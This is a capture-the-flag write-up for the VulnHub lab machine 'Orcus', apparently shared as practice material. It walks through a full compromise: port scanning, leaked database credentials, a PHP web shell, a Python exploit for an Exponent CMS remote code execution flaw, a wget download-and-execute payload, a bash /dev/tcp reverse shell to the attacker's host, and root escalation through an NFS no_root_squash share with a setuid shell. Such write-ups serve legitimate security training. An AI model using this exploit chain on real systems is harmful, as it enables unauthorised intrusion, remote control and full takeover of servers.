@@ -1,0 +1,360 @@
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA512
+
+# $Id: 2017_hackfest2016-orcus.txt,v 1.0 2017/03/18 13:16:31 dhn Exp $
+
+Writeup hackfest2016: Orcus [1]
+
+0x0) found the ports
+
+[dhn]::[~/dev/ctf/write_up/boot2root] export ip=174.0.42.16
+[dhn]::[~/dev/ctf/write_up/boot2root] nmap -A -T4 -p- $ip
+
+Starting Nmap 7.40 ( https://nmap.org ) at 2017-03-17 07:17 EDT
+Nmap scan report for S0106d8eb97aa701c.cg.shawcable.net (174.0.42.16)
+Host is up (0.00029s latency).
+Not shown: 65519 closed ports
+PORT      STATE SERVICE     VERSION
+22/tcp    open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 3a:48:6e:8e:3f:32:26:f8:b6:a1:c6:b1:70:73:37:75 (RSA)
+|_  256 04:55:e6:48:50:d6:93:d7:12:80:a0:68:bc:97:fa:33 (ECDSA)
+53/tcp    open  domain      ISC BIND 9.10.3-P4-Ubuntu
+| dns-nsid:
+|_  bind.version: 9.10.3-P4-Ubuntu
+80/tcp    open  http        Apache httpd 2.4.18 ((Ubuntu))
+| http-robots.txt: 30 disallowed entries (15 shown)
+| /exponent.js.php /exponent.js2.php /exponent.php
+| /exponent_bootstrap.php /exponent_constants.php /exponent_php_setup.php
+| /exponent_version.php /getswversion.php /login.php /overrides.php
+| /popup.php /selector.php /site_rss.php /source_selector.php
+|_/thumb.php
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html).
+110/tcp   open  pop3        Dovecot pop3d
+|_pop3-capabilities: UIDL CAPA AUTH-RESP-CODE STLS SASL PIPELINING TOP RESP-CODES
+| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
+| Not valid before: 2016-10-09T03:44:10
+|_Not valid after:  2026-10-09T03:44:10
+|_ssl-date: TLS randomness does not represent time
+111/tcp   open  rpcbind     2-4 (RPC #100000)
+| rpcinfo:
+|   program version   port/proto  service
+|   100000  2,3,4        111/tcp  rpcbind
+|   100000  2,3,4        111/udp  rpcbind
+|   100003  2,3,4       2049/tcp  nfs
+|   100003  2,3,4       2049/udp  nfs
+|   100005  1,2,3      44256/tcp  mountd
+|   100005  1,2,3      52810/udp  mountd
+|   100021  1,3,4      40495/tcp  nlockmgr
+|   100021  1,3,4      41906/udp  nlockmgr
+|   100227  2,3         2049/tcp  nfs_acl
+|_  100227  2,3         2049/udp  nfs_acl
+139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+143/tcp   open  imap        Dovecot imapd
+|_imap-capabilities: LITERAL+ have ENABLE listed Pre-login STARTTLS IMAP4rev1 capabilities ID OK more post-login LOGINDISABLEDA0001 SASL-IR LOGIN-REFERRALS IDLE
+| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
+| Not valid before: 2016-10-09T03:44:10
+|_Not valid after:  2026-10-09T03:44:10
+|_ssl-date: TLS randomness does not represent time
+443/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 3a:48:6e:8e:3f:32:26:f8:b6:a1:c6:b1:70:73:37:75 (RSA)
+|_  256 04:55:e6:48:50:d6:93:d7:12:80:a0:68:bc:97:fa:33 (ECDSA)
+445/tcp   open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
+993/tcp   open  ssl/imap    Dovecot imapd
+|_imap-capabilities: LITERAL+ have ENABLE Pre-login capabilities IMAP4rev1 listed ID OK more post-login SASL-IR AUTH=PLAINA0001 LOGIN-REFERRALS IDLE
+| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
+| Not valid before: 2016-10-09T03:44:10
+|_Not valid after:  2026-10-09T03:44:10
+|_ssl-date: TLS randomness does not represent time
+995/tcp   open  ssl/pop3    Dovecot pop3d
+| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
+| Not valid before: 2016-10-09T03:44:10
+|_Not valid after:  2026-10-09T03:44:10
+|_ssl-date: TLS randomness does not represent time
+2049/tcp  open  nfs_acl     2-3 (RPC #100227)
+37682/tcp open  mountd      1-3 (RPC #100005)
+40495/tcp open  nlockmgr    1-4 (RPC #100021)
+44256/tcp open  mountd      1-3 (RPC #100005)
+48311/tcp open  mountd      1-3 (RPC #100005)
+Service Info: Host: ORCUS; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+|_clock-skew: mean: -41s, deviation: 0s, median: -41s
+|_nbstat: NetBIOS name: ORCUS, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
+| smb-os-discovery:
+|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
+|   NetBIOS computer name: ORCUS\x00
+|   Workgroup: WORKGROUP\x00
+|_  System time: 2017-03-17T07:17:44-04:00
+| smb-security-mode:
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+|_smbv2-enabled: Server supports SMBv2 protocol
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 257.55 seconds
+
+0x1) use gobuster to found some interested folder/files
+
+[dhn]::[~/dev/ctf/write_up/boot2root] gobuster -w /usr/share/wordlists/dirb/common.txt -u $ip
+
+Gobuster v1.2                OJ Reeves (@TheColonial)
+=====================================================
+[+] Mode         : dir
+[+] Url/Domain   : http://174.0.42.16/
+[+] Threads      : 10
+[+] Wordlist     : /usr/share/wordlists/dirb/common.txt
+[+] Status codes : 204,301,302,307,200
+=====================================================
+/admin (Status: 301)
+/backups (Status: 301)
+/cron (Status: 301)
+/external (Status: 301)
+/FCKeditor (Status: 301)
+/files (Status: 301)
+/framework (Status: 301)
+/index.html (Status: 200)
+/install (Status: 301)
+/javascript (Status: 301)
+/LICENSE (Status: 200)
+/phpmyadmin (Status: 301)
+/index.php (Status: 200)
+/robots.txt (Status: 200)
+/themes (Status: 301)
+/tmp (Status: 301)
+/webalizer (Status: 200)
+/xmlrpc.php (Status: 200)
+=====================================================
+
+0x2) open firefox and go to http://$ip/backups/
+     hmm SimplePHPQuiz-Backupz.tar.gz interest?
+
+0x3) download and extract the tar after that extract db user/password
+
+[dhn]::[~/dev/ctf/write_up/boot2root] cat includes/db_conn.php
+<?php
+
+//Set the database access information as constants
+DEFINE ('DB_USER', 'dbuser');
+DEFINE ('DB_PASSWORD', 'dbpassword');
+DEFINE ('DB_HOST', 'localhost');
+DEFINE ('DB_NAME', 'quizdb');
+
+@ $dbc = new mysqli(DB_HOST, DB_USER, DB_PASSWORD, DB_NAME);
+
+if (mysqli_connect_error()){
+        echo "Could not connect to MySql. Please try again";
+        exit();
+}
+?>
+
+0x4) use the credentials to login into phpmyadmin: http://$ip/phpmyadmin/
+
+	User name   Host name   Password    Global privileges
+	dbuser      localhost   Yes         ALL PRIVILEGES
+
+0x8) create an webshell via 'into outfile' mechanism (path found on http://$ip/SimplePHPQuiz/index.php)
+
+	select "<?php passthru($_GET['cmd']); ?>" into outfile '/var/www/html/SimplePHPQuiz/sh.php';
+
+MySQL said: #1290 - The MySQL server is running with the --secure-file-priv option so it cannot execute this statement
+
+damn!
+
+0x5) enumeration, enumeration... find [2], [3]
+
+...
+security fix for rce issue, thanks to xiojunjie, CVE-ID 2016-7565
+...
+
+0x6) write and trigger the exploit
+
+[dhn]::[~/dev/ctf/write_up/boot2root] cat poc.py
+#!/usr/bin/env python
+# $Id: poc.py,v 1.0 2017/03/18 09:16:10 dhn Exp $
+
+import random
+import requests
+
+host = 'http://174.0.42.16/'
+write_path = "/var/www/html/tmp/"
+
+lhost = "174.0.42.42"
+lport = 8000
+
+def upload(name, url):
+    files = {'upload' : (name, open('evil.tar.gz'))}
+    resp = requests.post(url, files=files)
+    return resp.content
+
+def trigger(url, rstr):
+    req_inc = requests.get('{}/install/index.php?install_sample=../../files/{}'.format(url, rstr))
+    evilfile = '{}/evil.php'.format(host)
+    req_ = requests.post(evilfile, data={"cmd": "id"})
+    print("[+] Target exploited, acessing shell at " + evilfile)
+    print("[+] Running id: " + req_.text.replace("\n", ""))
+
+def exploit(url):
+    cmds = [
+            "wget http://" + str(lhost) + ":" + str(lport) + "/evil -O " + write_path + "/evil",
+            "chmod +x " + write_path + "/evil",
+            "bash -c " + write_path + "/evil"
+    ]
+    for payload in cmds:
+        evilfile = '{}/evil.php'.format(host)
+        req_ = requests.post(evilfile, data={"cmd": payload})
+        print("[+] Send Payload: " + payload)
+    print("[+] Done")
+
+def main(host):
+    if 'http://' not in host:
+        host = 'http://{}'.format(host)
+
+    host = host.rstrip('/')
+    url = '{}/framework/modules/file/connector/uploader_paste.php'.format(host)
+    rstr = random.randint(10,99)
+
+    req_eql = upload('{}.eql'.format(rstr), url)
+    req_tar = upload('{}.tar.gz'.format(rstr), url)
+
+    trigger(host, rstr)
+    exploit(host)
+
+if __name__ == "__main__":
+    main(host)
+
+[dhn]::[~/dev/ctf/write_up/boot2root] cat evil.php
+<?php passthru($_POST["cmd"]); ?>
+[dhn]::[~/dev/ctf/write_up/boot2root] tar ft evil.tar.gz
+evil.php
+[dhn]::[~/dev/ctf/write_up/boot2root] cat evil
+#!/usr/bin/env bash
+
+bash -i >& /dev/tcp/174.0.42.42/7766 0>&1
+
+[dhn]::[~/dev/ctf/write_up/boot2root] ./poc.py
+[+] Target exploited, acessing shell at http://174.0.42.16/evil.php
+[+] Running id: uid=33(www-data) gid=33(www-data) groups=33(www-data)
+[+] Send Payload: wget http://174.0.42.42:8000/evil -O /var/www/html/tmp//evil
+[+] Send Payload: chmod +x /var/www/html/tmp//evil
+[+] Send Payload: bash -c /var/www/html/tmp//evil
+[+] Done
+[dhn]::[~/dev/ctf/write_up/boot2root]
+
+0x7) in a other terminal start an "nc" listener
+
+[dhn]::[~/dev/ctf/write_up/boot2root] nc -lvp 7766
+listening on [any] 7766 ...
+connect to [174.0.42.42] from 174.0.42.16 40790
+bash: cannot set terminal process group (1621): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@Orcus:/var/www/html$
+
+0x8) gathering information
+
+www-data@Orcus:/var/www/html$ find / -name "*flag.txt*" 2>/dev/null
+/var/www/flag.txt
+www-data@Orcus:/var/www/html$
+
+0x9) get the first flag
+
+www-data@Orcus:/var/www/html$ cat /var/www/flag.txt
+868c889965b7ada547fae81f922e45c4
+www-data@Orcus:/var/www/html$
+
+0xa) update "shell"
+
+www-data@Orcus:/var/www/html$ python -c 'import pty;pty.spawn("/bin/bash")'
+www-data@Orcus:/var/www/html$
+
+0xb) privilege escalation - nfs share (no_root_squash)
+     the target has an nfs share on port 2049:
+
+[dhn]::[~/dev/ctf/write_up/boot2root] showmount -e $ip
+Export list for 192.168.178.59:
+/tmp *
+[dhn]::[~/dev/ctf/write_up/boot2root]
+
+www-data@Orcus:/var/www/html$ cat /etc/exports
+# /etc/exports: the access control list for filesystems which may be exported
+#		to NFS clients.  See exports(5).
+#
+# Example for NFSv2 and NFSv3:
+# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
+#
+# Example for NFSv4:
+# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
+# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
+#
+/tmp *(rw,no_root_squash)
+www-data@Orcus:/var/www/html$
+
+[root]::[~/dev/ctf/write_up/boot2root] mount -t nfs $ip:/tmp/ /mnt
+[root]::[~/dev/ctf/write_up/boot2root] cd /mnt/
+[root]::[~/dev/ctf/write_up/boot2root] cat suidsh.c
+#include <stdlib.h>
+#include <unistd.h>
+#include <stdio.h>
+int main() {
+	setuid(0);
+	setgid(0);
+	execl("/bin/sh", "sh", NULL);
+}
+[root]::[/mnt] gcc -m32 suidsh.c -o sh
+[root]::[/mnt] chmod +xs sh
+
+www-data@Orcus:/tmp$ ls -lsa
+total 140
+ 4 drwxrwxrwt 10 root     root      4096 Mar 18 08:39 .
+ 4 drwxr-xr-x 24 root     root      4096 Oct 30 23:05 ..
+ 4 drwxrwxrwt  2 root     root      4096 Mar 18 05:37 .ICE-unix
+ 4 drwxrwxrwt  2 root     root      4096 Mar 18 05:37 .Test-unix
+ 4 drwxrwxrwt  2 root     root      4096 Mar 18 05:37 .X11-unix
+ 4 drwxrwxrwt  2 root     root      4096 Mar 18 05:37 .XIM-unix
+ 4 drwxrwxrwt  2 root     root      4096 Mar 18 05:37 .font-unix
+ 8 -rwsr-sr-x  1 root     root      7420 Mar 18 08:09 sh
+ 4 -rw-r--r--  1 root     root       127 Mar 18 08:01 suidsh.c
+ 4 drwx------  3 root     root      4096 Mar 18 05:37 systemd-private-81d6564c6abb45798a1a8d6a62b51b33-dovecot.service-QLtQdX
+ 4 drwx------  3 root     root      4096 Mar 18 05:37 systemd-private-81d6564c6abb45798a1a8d6a62b51b33-systemd-timesyncd.service-v9Wa7W
+ 4 drwx------  2 root     root      4096 Mar 18 05:37 vmware-root
+www-data@Orcus:/tmp$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+www-data@Orcus:/tmp$ ./sh
+# id
+uid=0(root) gid=0(root) groups=0(root),33(www-data)
+#
+
+0xc) get the second flag
+
+# find / -name "flag.txt" 2>/dev/null
+/root/flag.txt
+/var/www/flag.txt
+# cat /root/flag.txt
+807307b49314f822985d0410de7d8bfe
+#
+
+[1] https://www.vulnhub.com/entry/hackfest2016-orcus,182/
+[2] https://github.com/exponentcms/exponent-cms/releases/tag/v2.4.0
+[3] http://www.openwall.com/lists/oss-security/2016/09/29/11
+
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1
+
+iQIcBAEBCgAGBQJYzS3aAAoJEKjdmUcmQRI8dnUQALM7yb4pSDtX9y+UHMG49rMw
+cJcBb1Jwxy8s3Sd5/grWWb2FK9D15Roi8koLtvBcGLPhG7XjNKC3ztweIl1mqbHW
+khWSBPYiV9+Ttgpk4dVug7RDKVc9z/RVGcqidQJrFmWbnlntaW8G7jNzoNqxLtWj
+RpKKolXVzHwAG4tW+rhApZ8ob11kv4JYLC+wMeeCMkYWpMOAFoy9aRcR8xgWTp+8
+8MgkfvYsiyvLxmBE+WnxGwr1EoziAf94rs5Vfn2+6NJKpGGdYCJtQlEZNR7OsIK5
+65nJ+CS4pMzDDqeT6xzqUC5QumV8hUAY10eXgcTg3XAyQ6GSGN/S7SLX3I9ATAsH
+cMU0FT3Xhv9T2L3shs60MuY4RaalX6O53N3Rwi8dnoAFn3wz/yGKO0TX+H6oIXLx
+F2AIAFsGztvh8r5fmlOg6jqoJaxUP7sNmAveD8ACKTYvUBbDVDsXut3GRpgiQmrk
+vqYQbRou1QsP7d3UC27MS4BHBogwTtMi2OBPPpZhhv/OKXJwCpa9kE33G0HhEKIu
+TjebcYPFEkebvSq/0ihNF6w5h57Vg5UjR3nEFnmrG9C8OUWyWFQvRWUcR4KPXY5E
++mKRJyqSmxJJ/s/LLiv+G5aOHLg/1a0bBf1sUlk5sqXKTQxV8orOA8BEnLjy6XKv
+pEjh0L3TjWFAlpt0hmax
+=SAQo
+-----END PGP SIGNATURE-----
